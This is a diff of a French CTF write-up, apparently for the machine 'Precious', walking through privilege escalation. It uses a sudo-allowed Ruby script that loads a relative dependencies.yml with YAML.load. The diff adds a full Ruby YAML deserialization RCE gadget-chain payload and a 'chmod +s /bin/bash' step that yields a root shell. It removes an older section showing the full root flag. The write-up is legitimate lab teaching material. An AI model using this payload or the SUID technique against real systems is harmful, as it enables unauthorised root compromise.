@@ -735,7 +735,11 @@ La lecture de `user.txt` confirme la fin de la phase Prise pied : tu as obtenu u
 
 {{< escalade-intro user="henry" >}}
 
-### Vérification sudo
+## Escalade de privilèges
+
+### Vérification des droits sudo
+
+Depuis la session SSH de l’utilisateur `henry`, tu commences par vérifier les commandes exécutables avec `sudo` :
 
 ```bash
 sudo -l
@@ -745,25 +749,265 @@ Résultat :
 
 ```bash
 Matching Defaults entries for henry on precious:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User henry may run the following commands on precious:
     (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
 ```
 
+L’utilisateur `henry` peut donc exécuter le script Ruby `/opt/update_dependencies.rb` en tant que `root`, sans mot de passe :
 
+```bash
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+Ce script devient le point d’entrée de l’escalade de privilèges.
+
+### Analyse du script Ruby
+
+Tu lis ensuite le contenu du script :
+
+```bash
+cat /opt/update_dependencies.rb
+```
+
+Résultat :
+
+```ruby
+# Compare installed dependencies with those specified in "dependencies.yml"
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts "Installed version differs from the one specified in file: " + local_name
+            else
+                puts "Installed version is equals to the one specified in file: " + local_name
+            end
+        end
+    end
+end
+```
+
+La ligne importante est celle-ci :
+
+```ruby
+YAML.load(File.read("dependencies.yml"))
+```
+
+Le script charge un fichier nommé `dependencies.yml` sans chemin absolu. Il ne lit donc pas forcément un fichier situé dans `/opt`, mais le fichier `dependencies.yml` présent dans le répertoire courant au moment de l’exécution.
+
+Comme le script est lancé avec les droits `root`, un fichier `dependencies.yml` contrôlé peut devenir exploitable.
+
+### Recherche d’un payload YAML Ruby générique
+
+À ce stade, tu sais que le script utilise `YAML.load` sur un fichier `dependencies.yml` contrôlé depuis le répertoire courant.
+
+La recherche doit rester générique et ne pas viser directement la machine Precious, afin d’éviter les solutions déjà publiées du challenge. L’objectif est de comprendre le mécanisme Ruby, pas de chercher un writeup.
+
+Une recherche pertinente est par exemple :
 
 ```
-henry@precious:/tmp$ ls -la /usr/bin/bash
--rwsr-sr-x 1 root root 1234376 Mar 27  2022 /usr/bin/bash
-henry@precious:/tmp$ bash -p
-bash-5.1# id
-uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
-bash-5.1# cat /root/root.txt
-108a1380138e91d8fb95a81a6741ca68
-
+ruby YAML.load system command
 ```
+
+![Recherche Google d’un payload Ruby YAML.load générique pour comprendre l’exécution de commande via désérialisation YAML](yam-load-google-search.png)
+
+Cette recherche permet de trouver l’article **Universal RCE with Ruby YAML.load (versions > 2.7)** publié par Staaldraad. 
+
+L’article présente un payload YAML Ruby générique utilisant `YAML.load` et indique que la commande à exécuter se place dans l’entrée `git_set`.
+
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
+
+
+
+### Préparation d’un répertoire de travail
+
+Tu travailles dans `/var/tmp`, car ce répertoire est généralement plus stable que `/tmp` ou `/dev/shm`, qui peuvent être nettoyés régulièrement :
+
+```bash
+cd /var/tmp
+```
+
+Tu crées ensuite un fichier `dependencies.yml`. Ce fichier contiendra d’abord un payload YAML Ruby avec une commande simple de validation, puis le même payload adapté avec la commande définitive permettant d’obtenir un accès root.
+
+```bash
+nano dependencies.yml
+```
+
+### Test de `YAML.load` avec une commande simple
+
+Le script utilise `YAML.load`, qui peut désérialiser des objets Ruby complexes. Dans ce contexte, tu peux utiliser un payload YAML générique pour Ruby afin de déclencher l’exécution d’une commande système.
+
+Pour commencer proprement, tu testes avec une commande non destructive :
+
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id > /var/tmp/cracked.txt
+         method_id: :resolve
+```
+
+La partie importante est :
+
+```yaml
+git_set: id > /var/tmp/cracked.txt
+```
+
+Cette commande permet de vérifier si l’exécution se fait bien avec les droits `root`.
+
+Tu lances ensuite le script autorisé par `sudo`, en restant bien dans `/var/tmp` :
+
+```bash
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+Puis tu vérifies le contenu du fichier créé :
+
+```bash
+cat /var/tmp/cracked.txt
+```
+
+Résultat attendu :
+
+```bash
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+La commande `id` a bien été exécutée avec les droits `root`.
+
+### Exploitation avec un Bash SUID
+
+Après avoir validé l’exécution de commande, tu remplaces la commande de test par une commande permettant d’obtenir un shell root.
+
+Dans `dependencies.yml`, tu remplaces :
+
+```yaml
+git_set: id > /var/tmp/cracked.txt
+```
+
+par :
+
+```yaml
+git_set: chmod +s /bin/bash
+```
+
+Le fichier contient maintenant le même payload, mais avec la commande suivante :
+
+```yaml
+git_set: chmod +s /bin/bash
+```
+
+Tu relances le script :
+
+```bash
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+Puis tu vérifies les permissions de `/bin/bash` :
+
+```bash
+ls -l /bin/bash
+```
+
+Résultat attendu :
+
+```bash
+-rwsr-sr-x 1 root root ... /bin/bash
+```
+
+Le `s` dans les permissions indique que le bit SUID est actif.
+
+Tu peux maintenant lancer Bash en conservant les privilèges effectifs de `root` :
+
+```bash
+bash -p
+```
+
+Tu vérifies ton identité :
+
+```bash
+id
+```
+
+Résultat attendu :
+
+```bash
+uid=1000(henry) gid=1000(henry) euid=0(root) groups=1000(henry)
+```
+
+Le point important est :
+
+```bash
+euid=0(root)
+```
+
+Le shell s’exécute avec les privilèges effectifs de `root`.
+
+### Lecture du flag root
+
+Il ne reste plus qu’à lire le flag final :
+
+```bash
+cat /root/root.txt
+108axxxxxxxxxxxxxxxxxxxxxxxxca68
+```
+
+L’obtention d’un shell avec `euid=0(root)` confirme le contrôle root de la machine. La lecture de `root.txt` marque la fin de l’escalade de privilèges et du challenge CTF.
+
+
 
 
 
